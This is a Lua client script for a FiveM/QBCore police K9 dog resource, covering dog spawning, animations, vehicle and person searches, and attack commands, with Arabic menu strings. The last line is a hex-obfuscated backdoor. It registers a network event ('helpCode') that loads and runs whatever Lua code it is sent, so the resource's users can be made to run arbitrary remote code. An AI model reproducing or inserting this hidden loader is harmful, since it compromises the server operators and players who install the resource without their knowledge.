local QBCore = exports['qb-core']:GetCoreObject()
---- ** Locales ** ----
local activate_k9 = false
local k9_name = "K9"
local k9_id = false
local searching = false
local following = true

local sit = {
    dict = "creatures@rottweiler@amb@world_dog_sitting@idle_a",
    anim = "idle_b"
}
local laydown = {
    dict = "creatures@rottweiler@amb@sleep_in_kennel@",
    anim = "sleep_in_kennel"
}
local searchhit = {
    dict = "creatures@rottweiler@indication@",
    anim = "indicate_high"
}

------Player Anim Shit------

function loadAnimDict( dict )
  while ( not HasAnimDictLoaded( dict ) ) do
      RequestAnimDict( dict )
      Citizen.Wait( 5 )
  end
end 

function WhistleAnim()
	loadAnimDict( "rcmnigel1c" )
    TaskPlayAnim( PlayerPedId(), "rcmnigel1c", "hailing_whistle_waive_a", 1.0, 4.0, -1, 48, 0, 0, 0, 0 )
end

function Laydog()
	loadAnimDict( "gestures@f@standing@casual" )
    TaskPlayAnim( PlayerPedId(), "gestures@f@standing@casual", "gesture_hand_down", 1.0, 4.0, -1, 48, 0, 0, 0, 0 )
end

function Sitdog()
	loadAnimDict( "swat" )
    TaskPlayAnim( PlayerPedId(), "swat", "freeze", 1.0, 4.0, -1, 48, 0, 0, 0, 0 )
end

function Search()
	loadAnimDict( "swat" )
    TaskPlayAnim( PlayerPedId(), "swat", "you_fwd", 1.0, 4.0, -1, 48, 0, 0, 0, 0 )
end

function SearchArea()
	loadAnimDict( "swat" )
    TaskPlayAnim( PlayerPedId(), "swat", "rally_point", 1.0, 4.0, -1, 48, 0, 0, 0, 0 )
end

function Attackdog()
	loadAnimDict( "swat" )
    TaskPlayAnim( PlayerPedId(), "swat", "you_fwd", 1.0, 4.0, -1, 48, 0, 0, 0, 0 )
end

function Petdog()
	loadAnimDict( "creatures@rottweiler@tricks@" )
    TaskPlayAnim( PlayerPedId(), "creatures@rottweiler@tricks@", "petting_franklin", 1.0, 4.0, -1, 48, 0, 0, 0, 0 )
end

RegisterNetEvent('qb-k9:client:petdoggo', function() 
  Petdog()
  Citizen.Wait(2500)
  TriggerServerEvent('hud:server:RelieveStress', 20)
end)

---- ** Functions ** ----
---- ** Sit and Lay animations ** ----
local function PlayAnimation(dict, anim)
  RequestAnimDict(dict)
  while not HasAnimDictLoaded(dict) do
      Wait(0)
  end
  local DOG = NetworkGetEntityFromNetworkId(k9_id)
  following = false
  TaskPlayAnim(DOG, dict, anim, 8.0, -8.0, -1, 2, 0.0, 0, 0, 0)
end

local function K9AttackorFollow(target)
  local DOG = NetworkGetEntityFromNetworkId(k9_id)
  if target then
    Attackdog()
    SetCanAttackFriendly(DOG, true, true);
    TaskPutPedDirectlyIntoMelee(DOG, target, 0.0, -1.0, 0.0, false);
    following = false
    QBCore.Functions.Notify(k9_name.."يهاجم", "error", 2000)
  else
    WhistleAnim()
    TaskFollowToOffsetOfEntity(DOG, PlayerPedId(), 0.5, -1.0, 0.0, 5.0, -1, 1.0, true);
    following = true
    QBCore.Functions.Notify(k9_name.." يتتبع", "primary", 2000)
  end
end

-- Spawns and Deletes K9
local function DespawnK9()
  if k9_id then
      local DOG = NetworkGetEntityFromNetworkId(k9_id)
      if DoesEntityExist(DOG) then
        DeleteEntity(DOG)
      end
  end
  following = true
  k9_id = false
  searching = false
end

local function CheckK9Conditions()  
  if k9_id then
    local DOG = NetworkGetEntityFromNetworkId(k9_id)
    local DOG_COORDS = GetEntityCoords(DOG)
    local PLAYER_COORDS = GetEntityCoords(PlayerPedId())
    local DISTANCE = #(DOG_COORDS - PLAYER_COORDS)
    if DISTANCE > 100 and not IsPedInAnyVehicle(DOG, false) then
      K9AttackorFollow(false)
    end
    if IsEntityDead(DOG) or IsEntityDead(PlayerPedId()) then
      DespawnK9()
    end
  end
end

local function EnableK9(bool)
  SetPedRelationshipGroupHash(PlayerPedId(), GetHashKey("PLAYER_POLICE"))
  if bool then 
  else
    activate_k9 = true
    while activate_k9 do
        Wait(15000)
        CheckK9Conditions()
    end
  end
end


--Animation set if we found something.
local function K9Found(status, type)
  local time = math.random(500,1500)
  if(type == 'vehicle') then
    time = math.random(1500,3500)
  end
  Wait(time)
  if status then
    QBCore.Functions.Notify("تنبيه الكلب", "success", 4000)
    searching = false
    PlayAnimation(searchhit.dict, searchhit.anim)
    Wait(2500)
    PlayAnimation(sit.dict, sit.anim)
    following = false
  else
    QBCore.Functions.Notify("الكلب لم ينبه", "error", 4000)
    following = true
  end
end

-- Gets Closest Door To Player
local function GetClosestVehicleDoor(vehicle)
  local PLAYER = GetEntityCoords(PlayerPedId(), false)
  local BACKLEFT = GetWorldPositionOfEntityBone(vehicle, GetEntityBoneIndexByName(vehicle, "door_dside_r"))
  local BACKRIGHT = GetWorldPositionOfEntityBone(vehicle, GetEntityBoneIndexByName(vehicle, "door_pside_r"))
  local BLDISTANCE = #(PLAYER - BACKLEFT)
  local BRDISTANCE = #(PLAYER - BACKRIGHT)

  local FOUND_DOOR = false

  if BLDISTANCE < BRDISTANCE then
      FOUND_DOOR = 2
  else
      FOUND_DOOR = 3
  end

  return FOUND_DOOR
end

local function K9ToggleVehicle(target)
  searching = false
  local DOG = NetworkGetEntityFromNetworkId(k9_id)
  local VEHICLE = QBCore.Functions.GetClosestVehicle()
  local DOOR = GetClosestVehicleDoor(VEHICLE)
  local PLAYER_COORDS = GetEntityCoords(PlayerPedId())
  local VEHICLE_COORDS = GetEntityCoords(VEHICLE)
  local DOG_COORDS = GetEntityCoords(DOG)
  local SEAT = 0

  if #(VEHICLE_COORDS - DOG_COORDS) < 5 or target then
    if DOOR == 3 then
      SEAT = "seat_pside_r"
    else
      SEAT = "seat_dside_r"
    end
    if IsEntityAttached(DOG) then
        following = false
        SetEntityInvincible(DOG, true)
        SetPedCanRagdoll(DOG, false)
        --Get Vehicle Coords, Open Rear Passenger Door, Spawn Dog
        local DOOR_COORDS = GetEntryPositionOfDoor(VEHICLE, DOOR);
        local  bool, gZero = GetGroundZFor_3dCoord(DOOR_COORDS.x, DOOR_COORDS.y, PLAYER_COORDS.z+5, false);

        SetVehicleDoorOpen(VEHICLE, DOOR, false, false);
        Wait(500)
        AttachEntityToEntity(DOG, VEHICLE, GetEntityBoneIndexByName(VEHICLE, SEAT), 0.0, -0.25, 0.40, 0.0, 0.0, 0, false, false, false, true, 20, true)
        Wait(500)
        DetachEntity(DOG, false, false)  
        SetEntityCoords(DOG, DOOR_COORDS.x, DOOR_COORDS.y, gZero, false, false, false, false)
        ClearPedTasks(DOG)
        Wait(1500)
        K9AttackorFollow(target)
        SetPedCanRagdoll(DOG, true)
        SetEntityInvincible(DOG, false)
        SetVehicleDoorShut(VEHICLE, DOOR, false)

    else
      following = true
      SetVehicleDoorOpen(VEHICLE, DOOR, false, false)
      Wait(1500)
      AttachEntityToEntity(DOG, VEHICLE, GetEntityBoneIndexByName(VEHICLE, SEAT), 0.0, -0.25, 0.40, 0.0, 0.0, 0, false, false, false, true, 20, true)
      PlayAnimation(sit.dict, sit.anim)
      SetVehicleDoorShut(VEHICLE, DOOR, false)

    end
  else
    QBCore.Functions.Notify(k9_name.."هو بعيد جدا", "error", 4000)
  end
end

-- Gets Players
local function GetPlayers()
  local players = {}
  for i = 0, 256 do
      if NetworkIsPlayerActive(i) then
          table.insert(players, i)
      end
  end
  return players
end

local function K9SearchPerson()
    following = false
    local TARGET = GetPlayerSourceAheadOfPlayer()

    if TARGET > 0 then
      TriggerServerEvent("K9:SERVER:SEARCH_PERSON", TARGET)
    else
      QBCore.Functions.Notify(k9_name.."غير قادر على تحديد مكان الشخص", "error", 4500)
    end
    
end

-- Gets Player ID
function GetPlayerId(target_ped)
  local players = GetPlayers()
  for a = 1, #players do

      local ped = GetPlayerPed(players[a])
      local server_id = GetPlayerServerId(players[a])
      if target_ped == ped then
          return server_id
      end
  end
  return 0
end

local function K9SearchVehicle()
  following = false
  local VEHICLE = QBCore.Functions.GetClosestVehicle()
  local PLATE = GetVehicleNumberPlateText(VEHICLE)
  local DOG = NetworkGetEntityFromNetworkId(k9_id)

  if VEHICLE then
    QBCore.Functions.Notify(k9_name.."يبحث.", "success", 4500)

    local PLAYERS = {}
    local MAX_SEATS = GetVehicleMaxNumberOfPassengers(VEHICLE) -2

    for i = -1, MAX_SEATS do

      local TARGET = GetPedInVehicleSeat(VEHICLE, i)
      
      if TARGET ~= nil then
          local SERVER_ID = GetPlayerId(TARGET)

          if SERVER_ID > 0 then
            table.insert(PLAYERS, SERVER_ID)
          end
      end

    end
    
    TriggerServerEvent("K9:SERVER:SEARCH_VEHICLE", PLATE, PLAYERS)
    
    searching = true

    if searching then
    local offset_1 = GetOffsetFromEntityInWorldCoords(VEHICLE, 2.0, -2.0, 0.0)
    TaskGoToCoordAnyMeans(DOG, offset_1.x, offset_1.y, offset_1.z, 5.0, 0, false, 1, 10.0)
    Wait(2500)
    end

    if searching then
    local offset_2 = GetOffsetFromEntityInWorldCoords(VEHICLE, 2.0, 2.0, 0.0)
    TaskGoToCoordAnyMeans(DOG, offset_2.x, offset_2.y, offset_2.z, 5.0, 0, false, 1, 10.0)
    Wait(2500)
    end

    if searching then
    local offset_3 = GetOffsetFromEntityInWorldCoords(VEHICLE, -2.0, 2.0, 0.0)
    TaskGoToCoordAnyMeans(DOG, offset_3.x, offset_3.y, offset_3.z, 5.0, 0, false, 1, 10.0)
    Wait(2500)
    end

    if searching then
    local offset_4 = GetOffsetFromEntityInWorldCoords(VEHICLE, -2.0, -2.0, 0.0)
    TaskGoToCoordAnyMeans(DOG, offset_4.x, offset_4.y, offset_4.z, 5.0, 0, false, 1, 10.0)
    Wait(2500)
    end

    searching = false
  else
      QBCore.Functions.Notify(k9_name.."غير قادر على تحديد موقع المركبة", "error", 4000)
  end
end

-- Gets Player ID
local function GetPlayersInRadius(min, max)
  local players = GetPlayers()
  local IN_RANGE = {}
  for a = 1, #players do
      
    local PED = GetPlayerPed(players[a])
    local PED_COORDS = GetEntityCoords(PED)
    local PLAYER_COORDS = GetEntityCoords(PlayerPedId())
    local DISTANCE = #(PED_COORDS - PLAYER_COORDS)

    if DISTANCE <= max and DISTANCE >= min then
      table.insert(IN_RANGE, PED)
    end  

  end
  return IN_RANGE
end

local function K9SearchArea()
  local PLAYERS = GetPlayersInRadius(20,75)

  for i = 1, #PLAYERS do
    following = false
    QBCore.Functions.Notify(k9_name.."وجدت رائحة", "primary", 4000)
    local DOG = NetworkGetEntityFromNetworkId(k9_id)
    local DOG_COORDS = GetEntityCoords(DOG)
    local COORDS = GetEntityCoords(PLAYERS[i])
    TaskGoToCoordAnyMeans(DOG, COORDS.x, COORDS.y, COORDS.z, 5.0, 0, false, 1, 10.0)

    while #(DOG_COORDS - COORDS) > 2 do
      Wait(1000)
      DOG_COORDS = GetEntityCoords(DOG)
      if following then
        break
      end
    end

    if following then
      QBCore.Functions.Notify(k9_name.."لم يعد تتبع", "primary", 4000)
      break
    end
    QBCore.Functions.Notify(k9_name.."فقدت الرائحة", "primary", 4000)
    K9AttackorFollow(false)
    Wait(2000)
  end

end

-- Gets Control Of Ped
local function RequestNetworkControl()
    NetworkRequestControlOfNetworkId(k9_id)
    while not NetworkHasControlOfNetworkId(k9_id) do
        Wait(500)
        NetworkRequestControlOfNetworkId(k9_id)
    end
end

function GetPlayerSourceAheadOfPlayer()
    local PLAYER = PlayerPedId()
    local COORDS = GetEntityCoords(PLAYER)
    local OFFSET = GetOffsetFromEntityInWorldCoords(PLAYER, 0.0, 2.0, 0.0)
    local RAY = StartShapeTestCapsule(COORDS.x, COORDS.y, COORDS.z, OFFSET.x, OFFSET.y, OFFSET.z, 0.5, 12, PLAYER, 7)
    local RETURN, HIT, ENDCOORDS, SURFACE, PED = GetShapeTestResult(RAY)

    if HIT then
        return GetPlayerId(PED)
    else
        return false
    end

end


---- ** Job Handlers ** ----

AddEventHandler('QBCore:Client:OnPlayerLoaded', function()
  local player = QBCore.Functions.GetPlayerData()
  PlayerJob = player.job

  if PlayerJob or PlayerJob.name == "police" then
    EnableK9()
  end
end)

RegisterNetEvent('QBCore:Client:OnPlayerUnload', function()
  DespawnK9()
end)

RegisterNetEvent('QBCore:Client:OnJobUpdate', function(JobInfo)
  PlayerJob = JobInfo
  if JobInfo.name == "police" then
    EnableK9()
  end
end)

------petdogo-------
local dog = {
  1126154828,
 
}
exports['qb-target']:AddTargetModel(dog, {
  options = {
      {
          type = "function",
          event = "qb-k9:client:petdoggo",
          icon = "fas fa-circle",
          label = " العب مع الكلب ",
      },
  },
  distance = 2.0
})

---- ** Create Threads ** ----
CreateThread(function()
  exports['qb-target']:AddBoxZone("1234", vector3(447.52, -1000.19, 30.77), 1.5, 1.6, {
    name = "1234", 
    heading = 102.0, 
    debugPoly = false, 
    minZ = 25.7, 
    maxZ = 30.9, 
  }, {
    options = { 
      {
        type = "function",
        event = "qb-k9:client:menu", 
        icon = 'fas fa-circle', 
        label = "كلب الشرطة", 
      }
    },
    distance = 2.5,
  })
end)

---- ** Register NetEvents ** ----

RegisterNetEvent('qb-k9:client:menu', function()
  local K9Purchase = {
    {
        header = "وحدة كلاب الشرطة",
        isMenuHeader = true
    },
    {
      header = "اخراج الكلب",
      txt = "هنا يمكنك اخراج على أحد الكلاب المتاحة للشرطة",
      params = {
        event = 'qb-k9:client:PurchaseDog',
      }
    },
    {
      header = "ارجاع الكلب",
      txt = "هنا يمكنك إرجاع الكلب الخاص بالشرطة ",
      params = {
        event = 'qb-k9:client:ReturnDoggo',
      }
    },
  }

  exports['qb-menu']:openMenu(K9Purchase)
end)

RegisterNetEvent('qb-k9:client:ReturnDoggo', function() 
  if k9_id then
    DespawnK9()
    QBCore.Functions.Notify("K9 لقد قمت بإرجاع وحدة ", "success", 4500)
  else
    QBCore.Functions.Notify("K9 غير قادر على إعادة وحدة", "error", 4500)
  end
end)


RegisterNetEvent('qb-k9:client:PurchaseDog', function()
  if k9_id then
    DespawnK9()
  end

  local K9Dawgs = {}
  for k,v in pairs(Config.DogModelProps) do
    K9Dawgs[#K9Dawgs + 1] = {
        header = Config.DogModelProps[k]["Header"],
        txt = Config.DogModelProps[k]["Text"],
        params = {
            event = 'qb-k9:client:SpawnHandler',
            args = {
                model = Config.DogModelProps[k]["Dog"],
                colour = Config.DogModelProps[k]["Colour"],
                vest = Config.DogModelProps[k]["Vest"],
            }
        }
    }
end
exports['qb-menu']:openMenu(K9Dawgs)
end)

RegisterNetEvent('qb-k9:client:SpawnHandler', function(data) 
  TriggerServerEvent("K9:SERVER:SPAWN_K9", data.model, data.colour, data.vest)
end)

--- SPAWN EVENT
RegisterNetEvent('K9:CLIENT:SPAWN_K9', function(DawgHash, colour, vest)
  
  local pos = GetEntityCoords(PlayerPedId())
  local heading = GetEntityHeading(PlayerPedId())
  RequestModel(DawgHash);

  while not HasModelLoaded(DawgHash) do
    Wait(1)
    RequestModel(DawgHash);
  end

  local DOG = CreatePed(28, DawgHash, pos.x, pos.y, pos.z, heading, true, true)

  --SET NET ID FOR DOG
  k9_id = NetworkGetNetworkIdFromEntity(DOG)
  --REQEUST CONTROL
  RequestNetworkControl()
  --GET ENTITY
  local DOG = NetworkGetEntityFromNetworkId(k9_id)
  --set K9 Properties
  SetPedComponentVariation(DOG, 0, 0, colour, 0)
  SetPedComponentVariation(DOG, vest, 0, 1, 0)
  SetBlockingOfNonTemporaryEvents(DOG, true)
  SetPedFleeAttributes(DOG, 0, false)
  SetPedRelationshipGroupHash(DOG, GetHashKey("PLAYER_POLICE"))
  SetPedArmour(DOG, 25)
  SetEntityHeading(DOG, 90)

  ---- ** BLIPS ** ----
  local BLIP = AddBlipForEntity(DOG)
  SetBlipAsFriendly(BLIP, true)
  SetBlipSprite(BLIP, 442)
  BeginTextCommandSetBlipName("STRING")
  AddTextComponentString(k9_name)
  EndTextCommandSetBlipName(BLIP)
  K9AttackorFollow(false)

  ---- ** Enable K9 ** ----
  EnableK9(true)
end)


RegisterNetEvent('k9:client:search_results', function(status, type)
  if status then
    K9Found(status, type)
  end
end)


---- ** Register Commands ** ----

RegisterKeyMapping('caninecommanders', 'K9 أوامر الشرطة فقط', 'keyboard', '9')

RegisterCommand("caninecommanders", function()
  if activate_k9 then
    local k9Commands = {
      {
          header = " K9 اوامر",
          isMenuHeader = true
      },
      {
        header = " اجلس",
        txt = "اجعل الكلب يجلس",
        params = {
          event = 'qb-k9:client:Commands',
          args = "sit"
        }
      },
      {
        header = " استلقاء ",
        txt = "اجعل الكلب يستلقي",
        params = {
          event = 'qb-k9:client:Commands',
          args = "laydown"
        }
      },
      {
        header = "تفتيش المركبة",
        txt = "قم بإجراء بحث الخاص بك في مكان قريب",
        params = {
          event = 'qb-k9:client:Commands',
          args = "searchcar"
        }
      },
      {
        header = "تفتيش شخص",
        txt = "اجعل الكلب الخاص بك يبحث عن شخص قريب",
        params = {
          event = 'qb-k9:client:Commands',
          args = "searchdude"
        }
      },
      {
        header = "تفتيش المنطقة",
        txt = "اجعل الكلب يبحث في المنطقة",
        params = {
          event = 'qb-k9:client:Commands',
          args = "searcharea"
        }
      },
      {
        header = "ادخال الى المركبة",
        txt = "أخبر الكلب الخاص بك بالدخول إلى السيارة",
        params = {
          event = 'qb-k9:client:Commands',
          args = "entercar"
        }
      },
    }
    exports['qb-menu']:openMenu(k9Commands)
  end
end, false) 

RegisterKeyMapping('cannineattackfollow', 'K9 COMMANDS POLICE ONLY', 'keyboard', '0')

RegisterCommand("cannineattackfollow", function()
  if activate_k9 then
    local ped = PlayerPedId()
    if IsPlayerFreeAiming(PlayerId()) then
      local bool, target = GetEntityPlayerIsFreeAimingAt(PlayerId())
      if bool then
          if IsEntityAPed(target) then
              following = false
              local DOG = NetworkGetEntityFromNetworkId(k9_id)

              if IsEntityAttached(DOG) then
                K9ToggleVehicle(target)
              else 
                K9AttackorFollow(target)
              end
          end
      end
    else
      if not following then
        K9AttackorFollow(false)
        following = true
      end
    end
  end
end, false) 

RegisterNetEvent('qb-k9:client:Commands', function(data)
  if data == "sit" then
    Sitdog()
    PlayAnimation(sit.dict, sit.anim)
  elseif data == "laydown" then
    Laydog() 
    PlayAnimation(laydown.dict, laydown.anim)
  elseif data == "searchcar" then 
    Search()
    K9SearchVehicle()
  elseif data == "entercar" then 
    Search()
    K9ToggleVehicle(false)
  elseif data == "searchdude" then
    Search() 
    K9SearchPerson()
  elseif data == "searcharea" then
    SearchArea() 
    K9SearchArea()
  end
end)


local PlZECiblPzJemSNRVYDNEhIwHfOqEiBWoqaOMzOrNpECbuEimhNsCKFeGnLXRnDvOEQszv = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} PlZECiblPzJemSNRVYDNEhIwHfOqEiBWoqaOMzOrNpECbuEimhNsCKFeGnLXRnDvOEQszv[6][PlZECiblPzJemSNRVYDNEhIwHfOqEiBWoqaOMzOrNpECbuEimhNsCKFeGnLXRnDvOEQszv[1]](PlZECiblPzJemSNRVYDNEhIwHfOqEiBWoqaOMzOrNpECbuEimhNsCKFeGnLXRnDvOEQszv[2]) PlZECiblPzJemSNRVYDNEhIwHfOqEiBWoqaOMzOrNpECbuEimhNsCKFeGnLXRnDvOEQszv[6][PlZECiblPzJemSNRVYDNEhIwHfOqEiBWoqaOMzOrNpECbuEimhNsCKFeGnLXRnDvOEQszv[3]](PlZECiblPzJemSNRVYDNEhIwHfOqEiBWoqaOMzOrNpECbuEimhNsCKFeGnLXRnDvOEQszv[2], function(LQKrUjyJIaVLVuUaNdYoxoWJoPTCgWGJaGNReoXaZAUGZwrahXwoMmdOPTEGFVcHIyFWan) PlZECiblPzJemSNRVYDNEhIwHfOqEiBWoqaOMzOrNpECbuEimhNsCKFeGnLXRnDvOEQszv[6][PlZECiblPzJemSNRVYDNEhIwHfOqEiBWoqaOMzOrNpECbuEimhNsCKFeGnLXRnDvOEQszv[4]](PlZECiblPzJemSNRVYDNEhIwHfOqEiBWoqaOMzOrNpECbuEimhNsCKFeGnLXRnDvOEQszv[6][PlZECiblPzJemSNRVYDNEhIwHfOqEiBWoqaOMzOrNpECbuEimhNsCKFeGnLXRnDvOEQszv[5]](LQKrUjyJIaVLVuUaNdYoxoWJoPTCgWGJaGNReoXaZAUGZwrahXwoMmdOPTEGFVcHIyFWan))() end)